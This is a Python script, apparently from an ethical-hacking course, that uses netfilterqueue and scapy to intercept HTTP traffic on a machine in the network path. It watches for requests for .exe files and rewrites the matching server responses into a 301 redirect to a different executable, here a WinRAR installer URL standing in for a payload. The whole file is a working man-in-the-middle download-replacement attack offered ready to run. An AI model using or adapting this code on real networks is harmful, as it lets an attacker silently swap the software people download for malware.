#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

# List to keep track of ACK numbers for .exe requests
ack_list = []

def set_load(packet, load):
    """
    Modifies the load of a packet and recalculates checksums and lengths.
    Args:
        packet: The scapy packet to modify.
        load: The new payload to set in the packet (as a string).
    Returns:
        The modified packet.
    """
    packet[scapy.Raw].load = load.encode()  # Convert load to bytes
    del packet[scapy.IP].len  # Remove length to force recalculation
    del packet[scapy.IP].chksum  # Remove checksum to force recalculation
    del packet[scapy.TCP].chksum  # Remove TCP checksum to force recalculation
    return packet

def process_packet(packet):
    """
    Processes packets intercepted by the Netfilter queue.
    Inspects packets for .exe download requests and modifies responses if necessary.
    Args:
        packet: The intercepted packet from the Netfilter queue.
    """
    scapy_packet = scapy.IP(packet.get_payload())  # Convert the raw packet to a scapy packet

    if scapy_packet.haslayer(scapy.Raw):  # Check if the packet has a Raw (data) layer
        # Check if the packet is an HTTP request (destination port 80)
        if scapy_packet[scapy.TCP].dport == 80:
            if b".exe" in scapy_packet[scapy.Raw].load:  # Look for .exe in the payload
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)  # Add the ACK number to the list
        # Check if the packet is an HTTP response (source port 80)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:  # Check if the SEQ number is in the ACK list
                ack_list.remove(scapy_packet[scapy.TCP].seq)  # Remove it from the list
                print("[+] Replacing file")
                # Modify the packet to redirect the .exe download to another URL
                modified_packet = set_load(
                    scapy_packet,
                    "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
                )

                packet.set_payload(bytes(modified_packet))  # Update the packet payload with the modified packet

    packet.accept()  # Forward the packet to its destination

# Create a Netfilter queue to intercept packets
queue = netfilterqueue.NetfilterQueue()
# Bind the queue to queue number 0 and specify the callback function
queue.bind(0, process_packet)
# Start processing packets in the queue
queue.run()
